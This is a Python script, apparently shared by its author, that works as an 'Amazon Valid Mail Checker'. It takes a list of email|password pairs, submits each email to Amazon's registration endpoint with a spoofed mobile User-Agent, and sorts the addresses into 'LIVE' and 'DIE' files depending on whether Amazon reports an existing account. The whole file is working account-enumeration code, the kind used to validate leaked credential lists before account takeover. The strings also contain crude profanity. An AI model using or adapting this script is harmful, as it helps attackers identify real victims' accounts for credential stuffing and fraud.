#Amz valid by KAngPAhrur
#gausah record lagi bro hadehhh
import os
import requests

HEADER = '\033[95m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
RESET = '\033[0m'

os.system('clear')
live = open('live.txt', 'w')
die = open('die.txt', 'w')
UNOKNOWN = open('UNOKNOWN.txt', 'w')

print ("- - - - - - - - - - - - - - - - - - - - - - - - - -")
print ("-            "+YELLOW+"Amazon Valid Mail Checker"+RESET+"            -")
print ("-                  FAHRURGANTENK                 -")
print ("- - - - - - - - - - - - - - - - - - - - - - - - - -")
print ("Example: mail@domain.com|password123 ")
print (" ")

mail = input(RED+'[!]'+RESET+' Input your maillist : ')
print ("Checking...")
mail = open(mail, 'r')
url = 'https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&'
headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B'}
requests = requests.session()
ambil = requests.get(url, headers=headers)

while True:
	list = mail.readline().replace('\n','')
	if not list:
		break
	anjay = list.strip().split('|')
	payload = {
		'customerName':'prhnbro',
		'email': anjay[0],
		'password':'anjaymabar',
		'passwordCheck':'anjaymabar'
		}
	tembak = requests.post(url, headers=headers, data=payload).text
	if "You indicated you are a new customer, but an account already exists with the e-mail" in tembak:
		print (BLUE+">> "+list+GREEN+" [LIVE]")
		live.write('[LIVE] - ' + list + '' '\n')
	else:
		print (BLUE+">> "+list+RED+" [DIE]")
		die.write('[DIE] - ' + list + '' '\n')

print (GREEN+"\nDone...\nChecking by KAngPAhrur")
print (RED+"\nDone...\nChecking by Memekmon")
